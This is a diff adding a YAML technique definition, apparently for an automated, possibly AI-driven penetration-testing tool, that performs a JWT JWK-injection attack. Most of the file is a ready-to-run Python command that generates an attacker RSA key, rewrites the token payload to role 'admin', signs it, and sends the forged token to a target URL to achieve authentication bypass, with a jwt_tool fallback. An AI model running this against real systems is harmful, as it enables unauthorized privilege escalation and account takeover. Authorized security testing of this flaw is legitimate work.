@@ -1,0 +1,102 @@
+name: jwt_jwk_injection
+category: web
+description: Inject attacker-controlled JWK into JWT header to forge self-signed tokens
+preconditions:
+- auth_endpoint_known
+- jwt_token_found
+parameters:
+  target_url: from_engagement.target_url
+  token: from_finding.jwt_token
+command_template: >
+  python3 -c "
+  import json, base64, sys
+  try:
+      from cryptography.hazmat.primitives.asymmetric import rsa, padding
+      from cryptography.hazmat.primitives import hashes, serialization
+      from cryptography.hazmat.backends import default_backend
+      import hmac as _hmac
+
+      token = '{token}'
+      target = '{target_url}'
+      parts = token.split('.')
+      if len(parts) != 3:
+          print('Invalid JWT'); sys.exit(1)
+
+      def b64d(s):
+          s += '=='*((4-len(s)%4)%4)
+          return base64.urlsafe_b64decode(s)
+      def b64e(b):
+          if isinstance(b, str): b = b.encode()
+          return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+      def int_to_b64(n):
+          length = (n.bit_length() + 7) // 8
+          return b64e(n.to_bytes(length, 'big'))
+
+      header = json.loads(b64d(parts[0]))
+      payload = json.loads(b64d(parts[1]))
+
+      print(f'Original header: {header}')
+
+      # Generate attacker RSA key
+      private_key = rsa.generate_private_key(65537, 2048, default_backend())
+      public_key = private_key.public_key()
+      pub_nums = public_key.public_numbers()
+
+      # Build embedded JWK (attacker controls this key)
+      jwk = {
+          'kty': 'RSA',
+          'n': int_to_b64(pub_nums.n),
+          'e': int_to_b64(pub_nums.e),
+          'use': 'sig',
+          'alg': 'RS256',
+      }
+
+      # Forge header with embedded JWK + escalate payload
+      new_header = {'alg': 'RS256', 'jwk': jwk}
+      if 'kid' in header:
+          new_header['kid'] = header['kid']
+      payload['role'] = 'admin'
+      payload['admin'] = True
+
+      hdr_b64 = b64e(json.dumps(new_header, separators=(',',':')))
+      pay_b64 = b64e(json.dumps(payload, separators=(',',':')))
+      msg = f'{hdr_b64}.{pay_b64}'.encode()
+
+      sig = private_key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
+      forged = f'{hdr_b64}.{pay_b64}.{b64e(sig)}'
+      print(f'FORGED_JWK_INJECTION_TOKEN: {forged[:100]}...')
+
+      # Test it
+      import urllib.request
+      req = urllib.request.Request(target,
+          headers={'Authorization': f'Bearer {forged}'})
+      try:
+          with urllib.request.urlopen(req, timeout=10) as r:
+              print(f'Response {r.status}: {r.read().decode()[:300]}')
+      except urllib.error.HTTPError as e:
+          print(f'Response {e.code}: {e.read().decode()[:200]}')
+  except ImportError as e:
+      print(f'Missing: {e}. Try: pip install cryptography')
+      # Fallback: use jwt_tool
+      import subprocess
+      result = subprocess.run(['python3','jwt_tool.py','{token}','-X','i'],
+                              capture_output=True, text=True, timeout=30)
+      print(result.stdout[:500])
+  "
+parser: web_response_parser
+expected_effects:
+- jwt_forged
+- auth_bypass_achieved
+falsifier:
+  pattern: 401|403|Invalid token|jwk not allowed in header
+  timeout: 30
+model_tier: sonnet
+mechanism: >
+  JWK injection: embed an attacker-generated RSA public key directly in the JWT header's
+  'jwk' field. If the server uses the header-embedded key for verification instead of a
+  pinned key set, the attacker can forge any payload signed with their private key.
+  RFC 8725 explicitly forbids using jwk/jku/x5u header parameters for verification.
+  Tool: jwt_tool -X i (injection mode). Also try 'x5c' header with attacker certificate.
+hacktricks_ref: pentesting-web/hacking-jwt-json-web-tokens.md
+destructive: false
+opsec: low
